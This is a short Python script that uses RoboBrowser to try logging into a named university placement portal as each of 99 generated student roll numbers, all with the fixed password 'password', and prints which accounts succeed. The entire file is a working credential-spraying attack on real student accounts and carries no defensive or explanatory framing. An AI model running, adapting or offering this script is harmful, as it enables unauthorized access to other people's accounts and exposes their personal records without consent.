from bs4 import BeautifulSoup
from robobrowser import RoboBrowser

loginUrl = "http://tnp.dtu.ac.in/rm_2016-17/intern/intern_login"
loginPassword = "password"

notifsUrl = "http://tnp.dtu.ac.in/rm_2016-17/intern/intern_student"

for i in range(1, 100):
    rollno = "00" + str(i) if i // 10 == 0 else "0" + str(i)
    loginUsername = "2K16/PS/" + rollno

    browser = RoboBrowser(history=True, parser="html.parser")
    browser.open(loginUrl)

    form = browser.get_form(0)
    form['intern_student_username_rollnumber'].value = loginUsername
    form['intern_student_password'].value = loginPassword
    browser.submit_form(form)
    browser.open(notifsUrl)
    soup = browser.parsed
    ul = soup.find('ul',attrs={'class':'timeline'})

    print(loginUsername + ": YES" if ul else loginUsername)
